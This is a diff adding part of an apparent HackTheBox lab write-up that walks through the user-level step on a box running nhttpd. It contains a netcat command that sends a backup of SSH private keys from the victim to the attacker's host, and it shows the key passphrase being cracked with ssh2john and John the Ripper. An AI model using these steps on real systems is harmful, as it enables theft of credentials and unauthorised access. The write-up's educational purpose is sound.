@@ -74,6 +74,66 @@ I cracked this hash & gained the cleartext password from it:
 
 Using this password I tried to switch to David from www-data & also tried to login via SSH but none of them worked. 😕
 
+I then searched about the nhttpd documentation & found [this](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd):
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/72ae33a3-9e70-4aad-8ce7-9b29691d7f78)
+
+Using the above logic, when I checked for the "~david", I observed that he is having his home dircetory hosted on the web:
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/59e62377-8aa1-4308-b5a0-9a6a76c09af9)
+
+Now, when I checked the existing "nhttpd.conf" file I observed the "homedirs_public" folder at "public_www":
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e0f70c5c-d579-4147-b234-05aa203a6b15)
+
+So, I moved into the David home directory & tried to list out the files but the current user doesn't have access for the David files, however I was able to cd into "public_www" folder located inside "David" home directory:
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0da7de0d-8a8a-4389-b96f-43bd99076013)
+
+While checking the directory, I observed a folder "cd protected-file-area" & in that folder I observed a backup file: "backup-ssh-identity-files.tgz".
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4c5e4650-68d0-4b12-b99c-dfe7ddafa84b)
+
+I transferred this backup file to my kali host using netcat:
+
+```bash
+#from the victim machine
+nc <kali IP> <Port> < backup-ssh-identity-files.tgz
+```
+```bash
+#from my attacking machine
+nc -lnvp <port> > output-file.tgz
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c1d9a98f-87d4-464a-82f9-161c2f05a53d)
+
+Once the transfer is completed I unzipped the file using 'tar' comaand:
+
+```bash
+tar xzvf backup-ssh.tgz
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5d34a73a-506f-4158-aba7-65484c993de6)
+
+After unzipping the file I got the "david" home directory which contains ssh private keys.
+
+I changed the SSH private key file permission using "chmod 600" & tried to login with this key. But observed that this key is encrypted & I need password to use this private key as well.
+
+So, I used John The ripper to crack the SSH private key password, using below command:
+
+```bash
+ssh2john id_rsa > john_rsa
+
+john john_rsa -w=/usr/share/wordlist/rockyou.txt
+```
+
+After conevrting the file into John the ripper format & using the same to crack, I got the clear-text credentials in just few seconds:
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4ba889f3-e112-447d-9a71-0b8164880ee8)
+
+After using the cracked credentilas, I was finally able to login to David & fetched the user flag as well. (pwn3d!🙂)
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/280cfb58-a11b-4191-aeca-6c1f3d056cad)
+
+
 
 
 
